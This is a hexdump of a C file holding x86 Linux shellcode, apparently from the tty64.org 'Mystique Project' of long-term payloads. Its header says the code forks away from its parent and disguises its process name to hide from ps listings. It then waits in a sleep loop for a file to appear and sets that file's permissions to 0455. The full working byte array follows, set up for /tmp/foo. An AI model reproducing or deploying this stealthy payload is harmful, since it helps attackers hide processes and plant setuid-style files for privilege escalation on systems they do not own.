00000000  2f 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*--------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000040  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2a 0d  |--------------*.|
00000050  0a 20 2a 20 20 20 20 20  20 20 20 20 20 5b 4d 79  |. *          [My|
00000060  73 74 69 71 75 65 20 50  72 6f 6a 65 63 74 3a 20  |stique Project: |
00000070  45 78 61 6d 70 6c 65 73  20 6f 66 20 6c 6f 6e 67  |Examples of long|
00000080  2d 74 65 72 6d 20 70 61  79 6c 6f 61 64 73 5d 20  |-term payloads] |
00000090  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |               *|
000000a0  0d 0a 20 2a 20 20 20 20  20 20 20 20 20 20 20 20  |.. *            |
000000b0  20 20 20 20 20 20 20 20  20 20 20 68 69 64 65 2d  |           hide-|
000000c0  77 61 69 74 2d 63 68 61  6e 67 65 20 63 6f 64 65  |wait-change code|
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000000f0  2a 0d 0a 20 2a 20 20 20  20 20 20 20 20 20 20 20  |*.. *           |
00000100  20 20 20 20 20 20 62 79  20 78 6f 72 74 40 74 74  |      by xort@tt|
00000110  79 36 34 2e 6f 72 67 20  20 26 20 20 69 7a 69 6b  |y64.org  &  izik|
00000120  40 74 74 79 36 34 2e 6f  72 67 20 20 20 20 20 20  |@tty64.org      |
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000140  20 2a 0d 0a 20 2a 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | *.. *----------|
00000150  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000190  2d 2d 2a 0d 0a 20 2a 20  54 68 69 73 20 63 6f 64  |--*.. * This cod|
000001a0  65 2c 20 75 70 6f 6e 20  65 78 65 63 75 74 69 6f  |e, upon executio|
000001b0  6e 2c 20 77 69 6c 6c 20  70 65 72 66 6f 72 6d 20  |n, will perform |
000001c0  74 68 65 20 66 6f 6c 6c  6f 77 69 6e 67 20 74 68  |the following th|
000001d0  69 6e 67 73 2e 2e 2e 20  20 20 20 20 20 20 20 20  |ings...         |
000001e0  20 20 20 2a 0d 0a 20 2a  20 20 20 20 20 20 20 20  |   *.. *        |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000230  20 20 20 20 2a 0d 0a 20  2a 20 20 20 31 29 20 46  |    *.. *   1) F|
00000240  6f 72 6b 20 61 20 6e 65  77 20 70 72 6f 63 65 73  |ork a new proces|
00000250  73 2c 20 61 6e 64 20 6b  69 6c 6c 20 50 50 49 44  |s, and kill PPID|
00000260  20 76 69 61 20 5f 65 78  69 74 28 29 20 73 6f 20  | via _exit() so |
00000270  77 65 20 67 65 74 20 69  6e 68 65 72 72 69 74 65  |we get inherrite|
00000280  64 20 20 20 20 2a 0d 0a  20 2a 20 20 20 20 20 20  |d    *.. *      |
00000290  62 79 20 69 6e 69 74 20  61 6e 64 20 6e 6f 77 20  |by init and now |
000002a0  68 61 76 65 20 61 20 6e  65 77 20 50 49 44 2e 20  |have a new PID. |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000002d0  20 20 20 20 20 20 2a 0d  0a 20 2a 20 20 20 32 29  |      *.. *   2)|
000002e0  20 57 69 6c 6c 20 6f 62  74 61 69 6e 20 74 68 65  | Will obtain the|
000002f0  20 63 75 72 72 65 6e 74  20 6c 6f 63 61 74 69 6f  | current locatio|
00000300  6e 20 6f 66 20 61 72 67  76 5b 30 5d 20 62 79 20  |n of argv[0] by |
00000310  72 65 74 72 69 65 76 69  6e 67 20 69 6e 66 6f 72  |retrieving infor|
00000320  6d 61 74 69 6f 6e 20 2a  0d 0a 20 2a 20 20 20 20  |mation *.. *    |
00000330  20 20 66 72 6f 6d 20 2f  70 72 6f 63 2f 73 65 6c  |  from /proc/sel|
00000340  66 2f 73 74 61 74 2e 20  20 20 20 20 20 20 20 20  |f/stat.         |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000370  20 20 20 20 20 20 20 20  2a 0d 0a 20 2a 20 20 20  |        *.. *   |
00000380  33 29 20 43 6f 70 79 20  74 68 65 20 6e 61 6d 65  |3) Copy the name|
00000390  20 77 65 20 77 69 73 68  20 74 6f 20 6d 61 73 71  | we wish to masq|
000003a0  75 61 72 61 64 65 20 61  73 20 69 6e 74 6f 20 61  |uarade as into a|
000003b0  72 67 76 5b 30 5d 20 69  6e 20 6d 65 6d 6f 72 79  |rgv[0] in memory|
000003c0  2e 20 20 20 20 20 20 20  20 2a 0d 0a 20 2a 20 20  |.        *.. *  |
000003d0  20 34 29 20 43 61 6c 6c  20 73 65 74 73 69 64 28  | 4) Call setsid(|
000003e0  29 20 74 6f 20 65 73 74  61 62 6c 69 73 68 20 6f  |) to establish o|
000003f0  75 72 73 65 6c 66 73 20  61 73 20 61 20 70 72 6f  |urselfs as a pro|
00000400  63 65 73 73 20 6c 65 61  64 65 72 2e 20 20 20 20  |cess leader.    |
00000410  20 20 20 20 20 20 20 20  20 20 2a 0d 0a 20 2a 20  |          *.. * |
00000420  20 20 35 29 20 57 69 6c  6c 20 73 6c 65 65 70 20  |  5) Will sleep |
00000430  76 69 61 20 6e 61 6e 6f  73 6c 65 65 70 28 29 20  |via nanosleep() |
00000440  66 6f 72 20 61 20 67 69  76 69 6e 20 69 6e 74 65  |for a givin inte|
00000450  72 76 61 6c 20 6f 66 20  74 69 6d 65 2e 20 20 20  |rval of time.   |
00000460  20 20 20 20 20 20 20 20  20 20 20 2a 0d 0a 20 2a  |           *.. *|
00000470  20 20 20 36 29 20 57 69  6c 6c 20 63 68 65 63 6b  |   6) Will check|
00000480  20 74 6f 20 73 65 65 20  69 66 20 61 20 66 69 6c  | to see if a fil|
00000490  65 20 65 78 69 73 74 20  76 69 61 20 61 63 63 65  |e exist via acce|
000004a0  73 73 28 29 2e 20 20 20  20 20 20 20 20 20 20 20  |ss().           |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 2a 0d 0a 20  |            *.. |
000004c0  2a 20 20 20 37 29 20 49  66 20 69 74 20 64 6f 65  |*   7) If it doe|
000004d0  73 20 6e 6f 74 20 4c 6f  6f 70 20 62 61 63 6b 20  |s not Loop back |
000004e0  74 6f 20 73 74 65 70 20  35 20 20 20 20 20 20 20  |to step 5       |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000500  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000510  20 2a 20 20 20 38 29 20  49 66 20 69 74 20 64 6f  | *   8) If it do|
00000520  65 73 20 74 68 65 6e 20  77 65 20 63 68 6d 6f 64  |es then we chmod|
00000530  28 29 20 74 68 65 20 66  69 6c 65 20 77 69 74 68  |() the file with|
00000540  20 70 65 72 6d 69 73 73  69 6f 6e 73 20 30 34 35  | permissions 045|
00000550  35 2e 20 20 20 20 20 20  20 20 20 20 20 20 2a 0d  |5.            *.|
00000560  0a 20 2a 20 20 20 39 29  20 43 61 6c 6c 73 20 5f  |. *   9) Calls _|
00000570  65 78 69 74 28 29 20 20  20 20 20 20 20 20 20 20  |exit()          |
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |               *|
000005b0  0d 0a 20 2a 20 20 20 20  20 20 20 20 20 20 20 20  |.. *            |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000600  2a 0d 0a 20 2a 20 20 2a  20 73 74 65 70 73 20 33  |*.. *  * steps 3|
00000610  2d 34 20 65 66 66 65 63  74 69 76 6c 79 20 68 69  |-4 effectivly hi|
00000620  64 65 20 75 73 20 66 72  6f 6d 20 6d 6f 73 74 20  |de us from most |
00000630  70 73 2d 6c 69 73 74 69  6e 67 73 20 20 20 20 20  |ps-listings     |
00000640  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000650  20 2a 0d 0a 20 2a 20 20  20 20 20 20 20 20 20 20  | *.. *          |
00000660  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000006a0  20 20 2a 0d 0a 20 2a 20  20 20 73 69 7a 65 3a 20  |  *.. *   size: |
000006b0  31 38 37 20 2b 20 73 74  72 6c 65 6e 28 6e 65 77  |187 + strlen(new|
000006c0  2d 70 72 6f 63 2d 6e 61  6d 65 29 20 2b 20 73 74  |-proc-name) + st|
000006d0  72 6c 65 6e 28 66 69 6c  65 2d 74 6f 2d 63 68 61  |rlen(file-to-cha|
000006e0  6e 67 65 29 20 20 20 20  20 20 20 20 20 20 20 20  |nge)            |
000006f0  20 20 20 2a 0d 0a 20 2a  2d 2d 2d 2d 2d 2d 2d 2d  |   *.. *--------|
00000700  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000740  2d 2d 2d 2d 2a 2f 0d 0a  09 0d 0a 63 68 61 72 20  |----*/.....char |
00000750  73 68 65 6c 6c 63 6f 64  65 5b 5d 3d 0d 0a 22 5c  |shellcode[]=.."\|
00000760  78 36 61 5c 78 30 32 5c  78 35 38 5c 78 63 64 5c  |x6a\x02\x58\xcd\|
00000770  78 38 30 5c 78 38 35 5c  78 63 30 5c 78 37 34 5c  |x80\x85\xc0\x74\|
00000780  78 37 39 5c 78 33 31 5c  78 63 30 5c 78 34 30 5c  |x79\x31\xc0\x40\|
00000790  78 63 64 5c 78 38 30 5c  78 35 62 5c 78 38 64 22  |xcd\x80\x5b\x8d"|
000007a0  0d 0a 22 5c 78 37 33 5c  78 31 30 5c 78 66 65 5c  |.."\x73\x10\xfe\|
000007b0  78 34 33 5c 78 30 66 5c  78 39 39 5c 78 33 31 5c  |x43\x0f\x99\x31\|
000007c0  78 63 39 5c 78 62 30 5c  78 30 35 5c 78 63 64 5c  |xc9\xb0\x05\xcd\|
000007d0  78 38 30 5c 78 39 33 5c  78 36 61 5c 78 30 33 5c  |x80\x93\x6a\x03\|
000007e0  78 35 38 22 0d 0a 22 5c  78 62 32 5c 78 66 61 5c  |x58".."\xb2\xfa\|
000007f0  78 38 39 5c 78 65 31 5c  78 32 39 5c 78 64 31 5c  |x89\xe1\x29\xd1\|
00000800  78 63 64 5c 78 38 30 5c  78 38 39 5c 78 63 66 5c  |xcd\x80\x89\xcf\|
00000810  78 30 31 5c 78 63 37 5c  78 39 33 5c 78 66 64 5c  |x01\xc7\x93\xfd\|
00000820  78 36 61 5c 78 32 30 22  0d 0a 22 5c 78 35 38 5c  |x6a\x20".."\x58\|
00000830  78 36 61 5c 78 30 65 5c  78 35 39 5c 78 38 37 5c  |x6a\x0e\x59\x87\|
00000840  78 63 62 5c 78 66 32 5c  78 61 65 5c 78 38 37 5c  |xcb\xf2\xae\x87\|
00000850  78 63 62 5c 78 65 32 5c  78 66 38 5c 78 34 37 5c  |xcb\xe2\xf8\x47\|
00000860  78 34 37 5c 78 33 31 5c  78 63 30 22 0d 0a 22 5c  |x47\x31\xc0".."\|
00000870  78 36 61 5c 78 30 61 5c  78 35 62 5c 78 66 63 5c  |x6a\x0a\x5b\xfc\|
00000880  78 33 31 5c 78 64 32 5c  78 38 61 5c 78 30 66 5c  |x31\xd2\x8a\x0f\|
00000890  78 38 33 5c 78 65 39 5c  78 33 30 5c 78 30 31 5c  |x83\xe9\x30\x01\|
000008a0  78 63 38 5c 78 34 37 5c  78 38 30 5c 78 33 66 22  |xc8\x47\x80\x3f"|
000008b0  0d 0a 22 5c 78 32 30 5c  78 37 34 5c 78 30 34 5c  |.."\x20\x74\x04\|
000008c0  78 66 37 5c 78 65 33 5c  78 65 62 5c 78 65 64 5c  |xf7\xe3\xeb\xed\|
000008d0  78 39 34 5c 78 35 66 5c  78 35 66 5c 78 39 34 5c  |x94\x5f\x5f\x94\|
000008e0  78 35 37 5c 78 62 31 5c  78 66 66 5c 78 33 31 5c  |x57\xb1\xff\x31\|
000008f0  78 63 30 22 0d 0a 22 5c  78 66 33 5c 78 61 61 5c  |xc0".."\xf3\xaa\|
00000900  78 35 66 5c 78 35 36 5c  78 34 65 5c 78 34 36 5c  |x5f\x56\x4e\x46\|
00000910  78 34 31 5c 78 38 30 5c  78 33 65 5c 78 66 66 5c  |x41\x80\x3e\xff\|
00000920  78 37 35 5c 78 66 39 5c  78 66 65 5c 78 30 36 5c  |x75\xf9\xfe\x06\|
00000930  78 35 65 5c 78 66 33 22  0d 0a 22 5c 78 61 34 5c  |x5e\xf3".."\xa4\|
00000940  78 62 30 5c 78 34 32 5c  78 63 64 5c 78 38 30 5c  |xb0\x42\xcd\x80\|
00000950  78 38 39 5c 78 66 37 5c  78 39 32 5c 78 34 38 5c  |x89\xf7\x92\x48\|
00000960  78 38 39 5c 78 63 31 5c  78 66 32 5c 78 61 65 5c  |x89\xc1\xf2\xae\|
00000970  78 66 65 5c 78 34 37 5c  78 66 66 22 0d 0a 22 5c  |xfe\x47\xff".."\|
00000980  78 66 66 5c 78 65 37 5c  78 65 38 5c 78 38 37 5c  |xff\xe7\xe8\x87\|
00000990  78 66 66 5c 78 66 66 5c  78 66 66 22 0d 0a 22 2f  |xff\xff\xff".."/|
000009a0  70 72 6f 63 2f 73 65 6c  66 2f 73 74 61 74 5c 78  |proc/self/stat\x|
000009b0  66 66 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |ff"             |
000009c0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 0d 0a 22  |          // .."|
000009d0  78 6f 72 74 20 61 6e 64  20 69 7a 69 6b 20 72 6f  |xort and izik ro|
000009e0  63 6b 73 20 74 68 65 20  6c 69 6e 75 78 20 62 6f  |cks the linux bo|
000009f0  78 5c 78 66 66 22 20 20  20 20 20 2f 2f 20 6e 65  |x\xff"     // ne|
00000a00  77 20 70 72 6f 63 20 6e  61 6d 65 0d 0a 22 2f 74  |w proc name.."/t|
00000a10  6d 70 2f 66 6f 6f 5c 78  66 66 22 20 20 20 20 20  |mp/foo\xff"     |
00000a20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a30  20 20 20 20 20 20 20 20  20 2f 2f 20 66 69 6c 65  |         // file|
00000a40  20 74 6f 20 63 68 6d 6f  64 0d 0a 22 5c 78 36 61  | to chmod.."\x6a|
00000a50  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000a60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a70  20 20 20 20 20 20 20 2f  2f 0d 0a 22 5c 78 30 33  |       //.."\x03|
00000a80  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000a90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000aa0  20 20 20 20 20 20 20 2f  2f 20 73 6c 65 65 70 2d  |       // sleep-|
00000ab0  74 69 6d 65 0d 0a 22 5c  78 34 30 5c 78 38 39 5c  |time.."\x40\x89\|
00000ac0  78 65 31 5c 78 38 39 5c  78 65 33 5c 78 33 34 5c  |xe1\x89\xe3\x34\|
00000ad0  78 61 32 5c 78 63 64 5c  78 38 30 5c 78 33 31 5c  |xa2\xcd\x80\x31\|
00000ae0  78 63 39 5c 78 38 39 5c  78 66 33 5c 78 33 34 5c  |xc9\x89\xf3\x34\|
00000af0  78 32 31 5c 78 63 64 22  0d 0a 22 5c 78 38 30 5c  |x21\xcd".."\x80\|
00000b00  78 38 35 5c 78 63 30 5c  78 37 35 5c 78 65 62 5c  |x85\xc0\x75\xeb\|
00000b10  78 62 30 5c 78 30 66 5c  78 36 36 5c 78 62 39 5c  |xb0\x0f\x66\xb9\|
00000b20  78 36 64 5c 78 30 39 5c  78 63 64 5c 78 38 30 5c  |x6d\x09\xcd\x80\|
00000b30  78 34 30 5c 78 63 64 5c  78 38 30 22 3b           |x40\xcd\x80";|
00000b3d
